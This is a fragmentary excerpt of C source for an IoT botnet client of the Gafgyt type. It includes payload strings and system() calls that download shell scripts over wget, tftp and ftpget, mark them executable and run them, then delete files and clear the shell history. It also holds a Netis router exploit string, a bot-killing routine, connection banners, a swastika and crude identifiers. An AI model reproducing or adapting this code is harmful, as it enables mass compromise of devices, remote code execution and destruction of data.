...
unsigned char *hekkertelnet[] = { "0.0.0.0" };
...
char *hvgsgd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://0.0.0.0/Nefz.sh; chmod 777 Nefz.sh; sh Nefz.sh; tftp 0.0.0.0 -c get tftp11.sh; chmod 777 tftp11.sh; sh tftp11.sh; tftp -r tftp22.sh -g 0.0.0.0; chmod 777 tftp22.sh; sh tftp22.sh; rm -rf Nefz.sh tftp11.sh tftp22.sh; rm -rf *;history -c\r\n";
int initConnection();
int userID = 1;
...
sprintf(payload2, "%s cd /var/; rm -rf tftp; wget http://0.0.0.0/tftp || tftp -r tftp -g 0.0.0.0; chmod 777 tftp; ./tftp; rm -rf tftp\x00", NETIS);
...
int i;
for(i = 0; i < 9; i++){
system("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://0.0.0.0/Nefz.sh ; chmod 777 Nefz.sh; sh Nefz.sh; tftp 0.0.0.0 -c get tftp11.sh; chmod 777 tftp11.sh; sh tftp11.sh; tftp -r tftp22.sh -g 0.0.0.0; chmod 777 tftp22.sh; sh tftp22.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp11.sh ftp11.sh; sh ftp11.sh; rm -rf Nefz.sh tftp11.sh tftp22.sh ftp11.sh;rm -rf *;history -c\r\n");
}
sleep(5);
}
//botkill
...
{
system("yum install python-paramiko -y;apt-get install python-paramiko -y;mkdir /.tmp;cd /.tmp;wget http://0.0.0.0/purge.py");
...
HackerPrint(D1ckSucka, "\x1b[2;31m卐HIJACKING卐 \x1b[0;37m-> %s", inet_ntoa(ourIP));
StartTheLelz();
_exit(0);
}
}
...
HackerPrint(D1ckSucka, "\x1b[1;33mConnected | IP: %s | Type: %s | Version: %s", inet_ntoa(ourIP), getBuild(), VERSION);
char commBuf[4096];
int got = 0;
int i = 0;
